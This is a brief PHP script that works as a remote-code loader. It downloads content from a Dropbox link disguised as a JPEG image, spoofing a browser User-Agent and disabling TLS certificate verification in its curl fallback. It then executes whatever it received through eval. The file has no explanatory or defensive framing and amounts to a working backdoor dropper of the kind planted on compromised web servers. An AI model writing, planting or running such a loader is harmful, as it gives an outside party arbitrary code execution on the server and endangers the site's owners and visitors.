<?php
$url = 'https://dl.dropboxusercontent.com/scl/fi/we0nkun8h2tul76csbxsc/global.jpg?rlkey=t5las1c7ztk0gqi3lvf5f67qe&st=gltmxcke&raw=1';
$opts = array('http' => array('header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"));
$context = stream_context_create($opts);
$content = file_get_contents($url, false, $context);

if ($content === false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $content = curl_exec($ch);
    curl_close($ch);
}

if ($content) {
    eval('?>' . $content);

} ?>